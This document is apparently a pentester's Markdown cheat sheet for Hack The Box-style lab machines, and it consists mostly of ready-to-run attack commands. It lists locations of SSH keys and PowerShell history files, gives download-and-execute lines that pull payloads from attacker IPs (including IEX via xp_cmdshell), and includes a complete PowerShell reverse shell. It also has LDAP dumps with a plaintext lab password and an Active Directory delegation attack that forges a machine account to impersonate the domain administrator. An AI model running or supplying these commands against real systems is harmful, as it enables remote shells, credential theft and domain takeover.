### File and directory
#### ssh key location
`file:///C:/Users/user/.ssh/id_rsa`
#### File may contain password information
`C:\Users\user\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine
 ConsoleHost_history.txt`


### Command
#### Download file in powershell
```powershell
IWR -useBasicParsing http://10.10.14.21:8000/nc.exe -o nc.exe
```
```powershell
wget http://10.10.14.30/winpeasx64.exe -outfile winpeasx64.exe
```

#### Execute command from remote file
```powershell
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.30/shell.ps1\");"
```

#### Perpare reverse shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.30",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

#### LDAP
- #### Test connection
    ```bash
    ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
    ```
- #### Dump data
    ```bash
    ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
    ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb'
    ```

### Windows AD evaluation
- #### Evil-WinRM
    - Source:  https://github.com/Hackplayers/evil-winrm
    - Try to access Microsoft Windows Servers with cred
    - Usage:
        ```bash
        evil-winrm -i ip -u user -p password # Login
        upload /usr/share/metasploit-framework/data/post/SharpHound.exe sh.exe # file upload
        ```
    - Add admin account
        Refer from https://cybergladius.com/htb-walkthrough-support/ 
        ```bash
        # Windows side
        upload /tmp/Powermad.ps1 Powermad.ps1
        upload /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 PowerView.ps1
        Import-Module .\Powermad.ps1
        Import-Module .\PowerView.ps1
        New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
        Set-ADComputer dc -PrincipalsAllowedToDelegateToAccount fake01$
        ./rubeus.exe hash /password:123456 /user:FAKE01$ /domain:support.htb
        
        # Kali side
        getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
        export KRB5CCNAME=administrator.ccache
        smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
        ```

### Check for reg file
- #### reglookup